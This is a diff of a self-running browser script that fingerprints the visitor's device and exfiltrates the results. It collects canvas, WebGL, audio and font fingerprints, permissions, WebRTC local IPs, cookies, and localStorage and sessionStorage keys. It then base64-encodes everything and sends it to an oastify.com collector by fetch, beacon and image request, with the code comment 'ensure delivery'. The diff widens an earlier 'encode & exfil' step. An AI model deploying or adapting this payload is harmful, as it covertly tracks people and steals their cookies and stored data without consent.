@@ -10,14 +10,15 @@
     (async () => {
         const sys = {};
 
-        // --- Navigator ---
+        // --- Navigator (exhaustive) ---
         const navProps = [
             'userAgent','appCodeName','appName','appVersion','platform','product','productSub',
             'vendor','vendorSub','language','languages','cookieEnabled','onLine','hardwareConcurrency',
             'deviceMemory','maxTouchPoints','doNotTrack','pdfViewerEnabled','webdriver','scheduling',
             'presentation','bluetooth','usb','credentials','keyboard','mediaCapabilities','mediaDevices',
             'permissions','geolocation','clipboard','wakeLock','windowControlsOverlay','storage',
-            'webkitTemporaryStorage','standalone','globalPrivacyControl','pdfViewerEnabled'
+            'webkitTemporaryStorage','standalone','globalPrivacyControl','pdfViewerEnabled',
+            'buildID','oscpu',' oscpu',' oscpu'  // Firefox-specific
         ];
         navProps.forEach(k => {
             try { sys['nav_'+k] = navigator[k]; } 
@@ -31,26 +32,39 @@
                     'platform','platformVersion','architecture','model','uaFullVersion',
                     'fullVersionList','bitness','wow64','formFactors'
                 ]);
+                sys.uaDataMobile = navigator.userAgentData.mobile;
+                sys.uaDataBrands = navigator.userAgentData.brands;
             }
         } catch(e) { sys.uaData = 'ERR:'+e.message; }
 
-        // --- Screen ---
+        // --- Screen (exhaustive) ---
         ['width','height','availWidth','availHeight','colorDepth','pixelDepth',
-         'availLeft','availTop','orientation','deviceXDPI','logicalXDPI'].forEach(k => {
+         'availLeft','availTop','orientation','deviceXDPI','logicalXDPI',
+         'mozOrientation','msOrientation'].forEach(k => {
             try { sys['screen_'+k] = screen[k]; } 
             catch(e) { sys['screen_'+k] = 'ERR:'+e.message; }
         });
 
-        // --- Window / Location / Document ---
+        // --- Window / Location / Document (exhaustive) ---
         sys.window = {
             innerWidth, innerHeight, outerWidth, outerHeight, screenX, screenY, screenLeft, screenTop,
             devicePixelRatio, visualViewport: visualViewport ? {
                 width: visualViewport.width, height: visualViewport.height,
-                scale: visualViewport.scale, offsetLeft: visualViewport.offsetLeft, offsetTop: visualViewport.offsetTop
+                scale: visualViewport.scale, offsetLeft: visualViewport.offsetLeft, offsetTop: visualViewport.offsetTop,
+                pageLeft: visualViewport.pageLeft, pageTop: visualViewport.pageTop
             } : null,
             length, name: window.name, opener: !!window.opener,
             isFramed: window.self !== window.top, isCrossOriginFramed: false,
-            crossOriginIsolated, closed
+            crossOriginIsolated, closed, innerWidth, innerHeight,
+            outerWidth, outerHeight, screenLeft, screenTop, screenX, screenY,
+            devicePixelRatio, length, status: window.status,
+            defaultStatus: window.defaultStatus, isSecureContext,
+            origin: window.origin, locationbar: { visible: window.locationbar?.visible },
+            menubar: { visible: window.menubar?.visible },
+            personalbar: { visible: window.personalbar?.visible },
+            scrollbars: { visible: window.scrollbars?.visible },
+            statusbar: { visible: window.statusbar?.visible },
+            toolbar: { visible: window.toolbar?.visible }
         };
         try { if (window.top.location.href) sys.window.isCrossOriginFramed = false; } 
         catch(e) { sys.window.isCrossOriginFramed = true; }
@@ -67,50 +81,99 @@
             readyState: document.readyState, characterSet: document.characterSet,
             compatMode: document.compatMode, documentMode: document.documentMode,
             inputEncoding: document.inputEncoding, securityPolicy: document.securityPolicy ? document.securityPolicy.toString() : null,
-            childElementCount: document.documentElement.childElementCount
+            childElementCount: document.documentElement.childElementCount,
+            doctype: document.doctype ? document.doctype.name : null,
+            implementation: document.implementation ? document.implementation.hasFeature('HTML', '1.0') : null,
+            documentURI: document.documentURI, baseURI: document.baseURI,
+            xmlEncoding: document.xmlEncoding, xmlVersion: document.xmlVersion,
+            fullscreenEnabled: document.fullscreenEnabled,
+            pictureInPictureEnabled: document.pictureInPictureEnabled,
+            fonts: 'fonts' in document ? true : false
         };
 
-        // --- Time / Locale ---
+        // --- Time / Locale (exhaustive) ---
         sys.locale = Intl.DateTimeFormat().resolvedOptions();
         sys.timezoneOffset = new Date().getTimezoneOffset();
+        sys.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        sys.date = new Date().toString();
 
-        // --- Plugins & MIME ---
+        // --- Plugins & MIME (exhaustive) ---
         try {
             sys.plugins = Array.from(navigator.plugins).map(p => ({
-                name: p.name, filename: p.filename, description: p.description, version: p.version
+                name: p.name, filename: p.filename, description: p.description, version: p.version,
+                length: p.length, item: p.item ? 'function' : null
             }));
+            sys.pluginsCount = navigator.plugins.length;
         } catch(e) { sys.plugins = 'ERR:'+e.message; }
         try {
             sys.mimeTypes = Array.from(navigator.mimeTypes).map(m => ({
-                type: m.type, description: m.description, enabledPlugin: m.enabledPlugin ? m.enabledPlugin.name : null
+                type: m.type, description: m.description, enabledPlugin: m.enabledPlugin ? m.enabledPlugin.name : null,
+                suffixes: m.suffixes
             }));
+            sys.mimeTypesCount = navigator.mimeTypes.length;
         } catch(e) { sys.mimeTypes = 'ERR:'+e.message; }
 
-        // --- WebGL ---
+        // --- WebGL (exhaustive, fixed deprecation) ---
         try {
             const c = document.createElement('canvas');
             const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
             if (gl) {
-                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                const params = {};
+                const pnames = [
+                    'VENDOR','RENDERER','VERSION','SHADING_LANGUAGE_VERSION',
+                    'MAX_TEXTURE_SIZE','MAX_VIEWPORT_DIMS','MAX_VERTEX_ATTRIBS',
+                    'MAX_VERTEX_TEXTURE_IMAGE_UNITS','MAX_RENDERBUFFER_SIZE',
+                    'MAX_TEXTURE_IMAGE_UNITS','MAX_COMBINED_TEXTURE_IMAGE_UNITS',
+                    'MAX_CUBE_MAP_TEXTURE_SIZE','MAX_FRAGMENT_UNIFORM_VECTORS',
+                    'MAX_VERTEX_UNIFORM_VECTORS','MAX_VARYING_VECTORS',
+                    'MAX_TEXTURE_MAX_ANISOTROPY_EXT'
+                ];
+                pnames.forEach(p => {
+                    try { params[p] = gl.getParameter(gl[p]); } catch(e) {}
+                });
+                
+                // Try deprecated extension safely
+                let unmasked = {};
+                try {
+                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (dbg) {
+                        unmasked.vendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
+                        unmasked.renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+                    }
+                } catch(e) { unmasked = 'deprecated'; }
+
                 sys.webgl = {
                     vendor: gl.getParameter(gl.VENDOR),
                     renderer: gl.getParameter(gl.RENDERER),
                     version: gl.getParameter(gl.VERSION),
                     shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
-                    unmaskedVendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : null,
-                    unmaskedRenderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : null,
-                    params: {
-                        maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
-                        maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
-                        maxVertexAttribs: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
-                        maxVertexTextureImageUnits: gl.getParameter(gl.MAX_VERTEX_TEXTURE_IMAGE_UNITS),
-                        maxRenderbufferSize: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE)
-                    }
+                    unmaskedVendor: unmasked.vendor || null,
+                    unmaskedRenderer: unmasked.renderer || null,
+                    params: params,
+                    extensions: gl.getSupportedExtensions()
                 };
             }
         } catch(e) { sys.webgl = 'ERR:'+e.message; }
 
-        // --- Canvas ---
+        // WebGL2
+        try {
+            const c2 = document.createElement('canvas');
+            const gl2 = c2.getContext('webgl2');
+            if (gl2) {
+                sys.webgl2 = {
+                    version: gl2.getParameter(gl2.VERSION),
+                    vendor: gl2.getParameter(gl2.VENDOR),
+                    renderer: gl2.getParameter(gl2.RENDERER),
+                    shadingLanguageVersion: gl2.getParameter(gl2.SHADING_LANGUAGE_VERSION),
+                    max3DTextureSize: gl2.getParameter(gl2.MAX_3D_TEXTURE_SIZE),
+                    maxArrayTextureLayers: gl2.getParameter(gl2.MAX_ARRAY_TEXTURE_LAYERS),
+                    maxColorAttachments: gl2.getParameter(gl2.MAX_COLOR_ATTACHMENTS),
+                    maxUniformBufferBindings: gl2.getParameter(gl2.MAX_UNIFORM_BUFFER_BINDINGS)
+                };
+            }
+        } catch(e) { sys.webgl2 = 'ERR:'+e.message; }
+
+        // --- Canvas Fingerprinting ---
         try {
             const c = document.createElement('canvas');
             const ctx = c.getContext('2d');
@@ -126,7 +189,7 @@
             sys.canvas = c.toDataURL();
         } catch(e) { sys.canvas = 'ERR:'+e.message; }
 
-        // --- Performance ---
+        // --- Performance (exhaustive) ---
         try {
             sys.performance = {
                 memory: performance.memory ? {
@@ -136,29 +199,55 @@
                 } : null,
                 timing: performance.timing ? {
                     navigationStart: performance.timing.navigationStart,
+                    redirectStart: performance.timing.redirectStart,
+                    redirectEnd: performance.timing.redirectEnd,
+                    fetchStart: performance.timing.fetchStart,
+                    domainLookupStart: performance.timing.domainLookupStart,
+                    domainLookupEnd: performance.timing.domainLookupEnd,
+                    connectStart: performance.timing.connectStart,
+                    connectEnd: performance.timing.connectEnd,
+                    secureConnectionStart: performance.timing.secureConnectionStart,
+                    requestStart: performance.timing.requestStart,
+                    responseStart: performance.timing.responseStart,
+                    responseEnd: performance.timing.responseEnd,
                     domLoading: performance.timing.domLoading,
                     domInteractive: performance.timing.domInteractive,
                     domContentLoadedEventStart: performance.timing.domContentLoadedEventStart,
+                    domContentLoadedEventEnd: performance.timing.domContentLoadedEventEnd,
                     domComplete: performance.timing.domComplete,
+                    loadEventStart: performance.timing.loadEventStart,
                     loadEventEnd: performance.timing.loadEventEnd
                 } : null,
                 navigation: performance.navigation ? {
                     type: performance.navigation.type,
                     redirectCount: performance.navigation.redirectCount
-                } : null
+                } : null,
+                now: performance.now(),
+                timeOrigin: performance.timeOrigin
             };
+            if (performance.getEntriesByType) {
+                sys.performance.paint = performance.getEntriesByType('paint').map(e => ({name: e.name, startTime: e.startTime}));
+                sys.performance.nav = performance.getEntriesByType('navigation').map(e => ({
+                    dns: e.domainLookupEnd - e.domainLookupStart,
+                    tcp: e.connectEnd - e.connectStart,
+                    ttfb: e.responseStart - e.requestStart,
+                    dom: e.domComplete - e.domInteractive,
+                    load: e.loadEventEnd - e.loadEventStart
+                }));
+            }
         } catch(e) { sys.performance = 'ERR:'+e.message; }
 
-        // --- Network / Connection ---
+        // --- Network / Connection (exhaustive) ---
         try {
             const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             if (c) sys.connection = {
                 effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt,
-                downlinkMax: c.downlinkMax, saveData: c.saveData, type: c.type
+                downlinkMax: c.downlinkMax, saveData: c.saveData, type: c.type,
+                metered: c.metered
             };
         } catch(e) { sys.connection = 'ERR:'+e.message; }
 
-        // --- Battery ---
+        // --- Battery (exhaustive) ---
         try {
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
@@ -169,23 +258,26 @@
             }
         } catch(e) { sys.battery = 'ERR:'+e.message; }
 
-        // --- Media Devices ---
+        // --- Media Devices (exhaustive) ---
         try {
             const devs = await navigator.mediaDevices.enumerateDevices();
             sys.mediaDevices = devs.map(d => ({
-                kind: d.kind, label: d.label,
+                kind: d.kind, label: d.label ? '[redacted]' : '',
                 deviceId: d.deviceId ? d.deviceId.slice(0,8)+'...' : '',
                 groupId: d.groupId ? d.groupId.slice(0,8)+'...' : ''
             }));
+            sys.mediaDevicesCount = devs.length;
         } catch(e) { sys.mediaDevices = 'ERR:'+e.message; }
 
-        // --- Permissions ---
+        // --- Permissions (exhaustive) ---
         try {
             const names = [
-                'accelerometer','ambient-light-sensor','background-sync','bluetooth','camera',
-                'clipboard-read','clipboard-write','geolocation','gyroscope','magnetometer',
-                'microphone','midi','notifications','payment-handler','persistent-storage',
-                'push','screen-wake-lock','storage-access','window-management','display-capture'
+                'accelerometer','ambient-light-sensor','background-fetch','background-sync',
+                'bluetooth','camera','clipboard-read','clipboard-write','display-capture',
+                'geolocation','gyroscope','magnetometer','microphone','midi','nfc',
+                'notifications','payment-handler','persistent-storage','push',
+                'screen-wake-lock','storage-access','window-management','local-fonts',
+                'idle-detection','periodic-background-sync','system-wake-lock'
             ];
             sys.permissions = {};
             for (const n of names) {
@@ -196,36 +288,47 @@
             }
         } catch(e) { sys.permissions = 'ERR:'+e.message; }
 
-        // --- Storage ---
+        // --- Storage (exhaustive) ---
         try {
             sys.storageEstimate = await navigator.storage.estimate();
             sys.localStorageLen = localStorage.length;
             sys.sessionStorageLen = sessionStorage.length;
+            sys.localStorageKeys = Object.keys(localStorage);
+            sys.sessionStorageKeys = Object.keys(sessionStorage);
+            sys.cookies = document.cookie.split(';').map(c => c.trim());
         } catch(e) { sys.storage = 'ERR:'+e.message; }
 
-        // --- History / Frames / Workers ---
+        // --- History / Frames / Workers / Caches ---
         sys.historyLength = history.length;
         sys.serviceWorker = 'serviceWorker' in navigator;
         sys.sharedWorker = 'SharedWorker' in window;
         sys.indexedDB = 'indexedDB' in window;
+        sys.cacheAPI = 'caches' in window;
         try {
             if (indexedDB.databases) {
                 const dbs = await indexedDB.databases();
                 sys.indexedDBs = dbs.map(d => d.name);
             }
         } catch(e) { sys.indexedDBs = 'ERR:'+e.message; }
+        try {
+            if (window.caches) {
+                const keys = await caches.keys();
+                sys.cacheKeys = keys;
+            }
+        } catch(e) { sys.cacheKeys = 'ERR:'+e.message; }
 
         // --- Notifications ---
         try { sys.notificationPermission = Notification.permission; } 
         catch(e) { sys.notificationPermission = 'ERR:'+e.message; }
 
-        // --- Feature / API existence checks ---
+        // --- Feature / API existence (exhaustive) ---
         sys.features = {
             wasm: typeof WebAssembly === 'object',
             sharedArrayBuffer: typeof SharedArrayBuffer !== 'undefined',
             bigInt: typeof BigInt !== 'undefined',
             proxy: typeof Proxy !== 'undefined',
             weakRef: typeof WeakRef !== 'undefined',
+            finalizationRegistry: typeof FinalizationRegistry !== 'undefined',
             fetch: typeof fetch !== 'undefined',
             streams: typeof ReadableStream !== 'undefined',
             crypto: typeof crypto !== 'undefined' && typeof crypto.subtle !== 'undefined',
@@ -240,32 +343,270 @@
             clipboardRead: 'clipboard' in navigator && !!(navigator.clipboard && navigator.clipboard.readText),
             presentation: 'presentation' in navigator,
             webDriver: navigator.webdriver,
-            credentialManagement: 'credentials' in navigator
+            credentialManagement: 'credentials' in navigator,
+            paymentRequest: 'PaymentRequest' in window,
+            speechRecognition: 'SpeechRecognition' in window || 'webkitSpeechRecognition' in window,
+            speechSynthesis: 'speechSynthesis' in window,
+            webXR: 'XR' in window || 'xr' in navigator,
+            webGPU: 'gpu' in navigator,
+            fileSystemAccess: 'showOpenFilePicker' in window,
+            webLocks: 'locks' in navigator,
+            storageBuckets: 'storageBuckets' in navigator,
+            deviceOrientation: 'DeviceOrientationEvent' in window,
+            deviceMotion: 'DeviceMotionEvent' in window,
+            resizeObserver: 'ResizeObserver' in window,
+            intersectionObserver: 'IntersectionObserver' in window,
+            mutationObserver: 'MutationObserver' in window,
+            reportingObserver: 'ReportingObserver' in window,
+            webAnimations: 'Animation' in window,
+            customElements: 'customElements' in window,
+            shadowDOM: 'attachShadow' in document.createElement('div'),
+            template: 'content' in document.createElement('template'),
+            modules: 'noModule' in HTMLScriptElement.prototype,
+            importMaps: 'supports' in HTMLScriptElement && HTMLScriptElement.supports('importmap'),
+            serviceWorker: 'serviceWorker' in navigator,
+            backgroundSync: 'sync' in ServiceWorkerRegistration.prototype,
+                periodicSync: 'periodicSync' in ServiceWorkerRegistration.prototype,
+            pushManager: 'PushManager' in window,
+            beacon: 'sendBeacon' in navigator,
+            requestIdleCallback: 'requestIdleCallback' in window,
+            requestAnimationFrame: 'requestAnimationFrame' in window,
+            matchMedia: 'matchMedia' in window,
+            broadcastChannel: 'BroadcastChannel' in window,
+            messageChannel: 'MessageChannel' in window,
+            offscreenCanvas: 'OffscreenCanvas' in window,
+            imageBitmap: 'createImageBitmap' in window,
+            mediaRecorder: 'MediaRecorder' in window,
+            mediaSource: 'MediaSource' in window,
+            webAudio: 'AudioContext' in window || 'webkitAudioContext' in window,
+            webRTC: 'RTCPeerConnection' in window,
+            webSocket: 'WebSocket' in window,
+            eventSource: 'EventSource' in window,
+            fetchEventSource: 'fetch' in window,
+            url: 'URL' in window && 'createObjectURL' in URL,
+            urlSearchParams: 'URLSearchParams' in window,
+            formData: 'FormData' in window,
+            blob: 'Blob' in window,
+            file: 'File' in window,
+            fileReader: 'FileReader' in window,
+            arrayBuffer: 'ArrayBuffer' in window,
+            dataView: 'DataView' in window,
+            typedArrays: {
+                int8: 'Int8Array' in window,
+                uint8: 'Uint8Array' in window,
+                uint8clamped: 'Uint8ClampedArray' in window,
+                int16: 'Int16Array' in window,
+                uint16: 'Uint16Array' in window,
+                int32: 'Int32Array' in window,
+                uint32: 'Uint32Array' in window,
+                float32: 'Float32Array' in window,
+                float64: 'Float64Array' in window,
+                bigint64: 'BigInt64Array' in window,
+                biguint64: 'BigUint64Array' in window
+            }
         };
 
-        // --- Media Queries / CSS ---
+        // --- Media Queries / CSS (exhaustive) ---
         sys.mediaQueries = {
             prefersColorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light',
             prefersReducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches,
             prefersReducedData: window.matchMedia('(prefers-reduced-data: reduce)').matches,
             prefersContrast: window.matchMedia('(prefers-contrast: more)').matches ? 'more' : 
                              window.matchMedia('(prefers-contrast: less)').matches ? 'less' : 'no-preference',
+            prefersReducedTransparency: window.matchMedia('(prefers-reduced-transparency: reduce)').matches,
+            prefersColorSchemeLight: window.matchMedia('(prefers-color-scheme: light)').matches,
             hover: window.matchMedia('(hover: hover)').matches,
+            hoverNone: window.matchMedia('(hover: none)').matches,
             pointer: window.matchMedia('(pointer: coarse)').matches ? 'coarse' : 
                      window.matchMedia('(pointer: fine)').matches ? 'fine' : 'none',
-            anyPointer: window.matchMedia('(any-pointer: coarse)').matches ? 'coarse' : 'fine'
+            anyPointer: window.matchMedia('(any-pointer: coarse)').matches ? 'coarse' : 'fine',
+            anyHover: window.matchMedia('(any-hover: hover)').matches,
+            invertedColors: window.matchMedia('(inverted-colors: inverted)').matches,
+            forcedColors: window.matchMedia('(forced-colors: active)').matches,
+            scripting: window.matchMedia('(scripting: enabled)').matches,
+            updateFast: window.matchMedia('(update: fast)').matches,
+            grid: window.matchMedia('(grid: 1)').matches,
+            overflowBlock: window.matchMedia('(overflow-block: scroll)').matches,
+            overflowInline: window.matchMedia('(overflow-inline: scroll)').matches,
+            monochrome: window.matchMedia('(monochrome)').matches ? window.matchMedia('(monochrome)').matches : 0,
+            resolution: window.matchMedia('(resolution: 2dppx)').matches ? 2 : 1,
+            displayMode: window.matchMedia('(display-mode: standalone)').matches ? 'standalone' :
+                        window.matchMedia('(display-mode: fullscreen)').matches ? 'fullscreen' :
+                        window.matchMedia('(display-mode: minimal-ui)').matches ? 'minimal-ui' : 'browser'
         };
 
-        // Encode & exfil
+        // --- WebRTC Local IP Leak ---
+        try {
+            const pc = new RTCPeerConnection({iceServers: []});
+            pc.createDataChannel('');
+            pc.createOffer().then(o => pc.setLocalDescription(o));
+            sys.webrtc = [];
+            pc.onicecandidate = ice => {
+                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                const ip = /([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/.exec(ice.candidate.candidate);
+                if (ip) sys.webrtc.push(ip[1]);
+            };
+            await new Promise(r => setTimeout(r, 1000));
+        } catch(e) { sys.webrtc = 'ERR:'+e.message; }
+
+        // --- AudioContext Fingerprinting ---
+        try {
+            const AudioContext = window.AudioContext || window.webkitAudioContext;
+            if (AudioContext) {
+                const ctx = new AudioContext();
+                const osc = ctx.createOscillator();
+                const analyser = ctx.createAnalyser();
+                const gain = ctx.createGain();
+                const script = ctx.createScriptProcessor(4096, 1, 1);
+                
+                osc.connect(analyser);
+                analyser.connect(gain);
+                gain.connect(script);
+                script.connect(ctx.destination);
+                
+                osc.type = 'triangle';
+                osc.frequency.value = 10000;
+                
+                const buf = new Float32Array(analyser.frequencyBinCount);
+                analyser.getFloatFrequencyData(buf);
+                
+                sys.audio = {
+                    sampleRate: ctx.sampleRate,
+                    state: ctx.state,
+                    baseLatency: ctx.baseLatency,
+                    outputLatency: ctx.outputLatency,
+                    maxChannelCount: ctx.destination.maxChannelCount,
+                    numberOfInputs: ctx.destination.numberOfInputs,
+                    numberOfOutputs: ctx.destination.numberOfOutputs,
+                    channelCount: ctx.destination.channelCount,
+                    channelCountMode: ctx.destination.channelCountMode,
+                    channelInterpretation: ctx.destination.channelInterpretation,
+                    frequencyData: Array.from(buf).slice(0, 10).map(v => Math.round(v * 100) / 100)
+                };
+                osc.stop();
+                ctx.close();
+            }
+        } catch(e) { sys.audio = 'ERR:'+e.message; }
+
+        // --- Font Detection ---
+        try {
+            const baseFonts = ['monospace', 'sans-serif', 'serif'];
+            const fontList = [
+                'Arial','Arial Black','Arial Narrow','Calibri','Cambria','Cambria Math',
+                'Comic Sans MS','Consolas','Courier','Courier New','Georgia','Helvetica',
+                'Impact','Lucida Console','Lucida Sans Unicode','Microsoft Sans Serif',
+                'MS Gothic','MS PGothic','MS Sans Serif','MS Serif','Palatino Linotype',
+                'Segoe Print','Segoe Script','Segoe UI','Tahoma','Times','Times New Roman',
+                'Trebuchet MS','Verdana','Wingdings','Wingdings 2','Wingdings 3'
+            ];
+            const testString = 'mmmmmmmmmmlli';
+            const testSize = '72px';
+            const h = document.createElement('span');
+            h.style.position = 'absolute';
+            h.style.left = '-9999px';
+            h.style.fontSize = testSize;
+            h.innerText = testString;
+            document.body.appendChild(h);
+            
+            const defaultWidths = {};
+            baseFonts.forEach(base => {
+                h.style.fontFamily = base;
+                defaultWidths[base] = h.offsetWidth;
+            });
+            
+            sys.detectedFonts = [];
+            fontList.forEach(font => {
+                let detected = false;
+                baseFonts.forEach(base => {
+                    h.style.fontFamily = `"${font}", ${base}`;
+                    if (h.offsetWidth !== defaultWidths[base]) detected = true;
+                });
+                if (detected) sys.detectedFonts.push(font);
+            });
+            document.body.removeChild(h);
+        } catch(e) { sys.detectedFonts = 'ERR:'+e.message; }
+
+        // --- Math / Hardware Fingerprinting ---
+        sys.math = {
+            acos: Math.acos(0.5).toString(),
+            acosh: Math.acosh(1.5).toString(),
+            asinh: Math.asinh(0.5).toString(),
+            atanh: Math.atanh(0.5).toString(),
+            expm1: Math.expm1(1).toString(),
+            sinh: Math.sinh(1).toString(),
+            cosh: Math.cosh(1).toString(),
+            tanh: Math.tanh(1).toString()
+        };
+
+        // --- Gamepads ---
+        try {
+            const gamepads = navigator.getGamepads ? Array.from(navigator.getGamepads()).filter(Boolean) : [];
+            sys.gamepads = gamepads.map(g => ({
+                id: g.id, index: g.index, connected: g.connected,
+                mapping: g.mapping, axes: g.axes.length, buttons: g.buttons.length
+            }));
+        } catch(e) { sys.gamepads = 'ERR:'+e.message; }
+
+        // --- VR / XR ---
+        try {
+            if (navigator.xr) {
+                const modes = ['inline', 'immersive-vr', 'immersive-ar'];
+                sys.xr = {};
+                for (const m of modes) {
+                    try {
+                        sys.xr[m] = await navigator.xr.isSessionSupported(m);
+                    } catch(e) { sys.xr[m] = false; }
+                }
+            }
+        } catch(e) { sys.xr = 'ERR:'+e.message; }
+
+        // --- Touch / Pointer Events ---
+        sys.touch = {
+            maxTouchPoints: navigator.maxTouchPoints,
+            ontouchstart: 'ontouchstart' in window,
+            touchEvent: 'TouchEvent' in window,
+            pointerEvent: 'PointerEvent' in window,
+            onpointerdown: 'onpointerdown' in window
+        };
+
+        // --- Keyboard / Input ---
+        sys.keyboard = {
+            onkeydown: 'onkeydown' in window,
+            onkeyup: 'onkeyup' in window,
+            onkeypress: 'onkeypress' in window,
+            getLayoutMap: navigator.keyboard && navigator.keyboard.getLayoutMap ? true : false
+        };
+        try {
+            if (navigator.keyboard && navigator.keyboard.getLayoutMap) {
+                const map = await navigator.keyboard.getLayoutMap();
+                sys.keyboardLayout = {};
+                ['KeyQ','KeyW','KeyE','KeyR','KeyA','KeyS','KeyD','KeyF','Space','Enter','ShiftLeft'].forEach(k => {
+                    sys.keyboardLayout[k] = map.get(k);
+                });
+            }
+        } catch(e) { sys.keyboardLayout = 'ERR:'+e.message; }
+
+        // --- Math Constants for Fingerprinting ---
+        sys.hardware = {
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory,
+            maxTouchPoints: navigator.maxTouchPoints
+        };
+
+        // --- Encoding & send ---
         const json = JSON.stringify(sys, (k,v) => {
             if (v instanceof Error) return v.toString();
             if (typeof v === 'function') return v.toString();
+            if (v === undefined) return 'undefined';
             return v;
         });
         const b64 = btoa(unescape(encodeURIComponent(json)));
+        const url = `https://ld2evoeentalwtwpg5bs18kz0q6hu8ix.oastify.com/?data=${encodeURIComponent(b64)}&fetched_by_js=1`;
 
-        fetch(`https://ld2evoeentalwtwpg5bs18kz0q6hu8ix.oastify.com/?data=${encodeURIComponent(b64)}&fetched_by_js=1`)
-          .catch(() => {});
+        // Send via multiple methods to ensure delivery
+        fetch(url, { mode: 'no-cors' }).catch(() => {});
+        navigator.sendBeacon && navigator.sendBeacon(url);
+        new Image().src = url;
     })();
     </script>
 
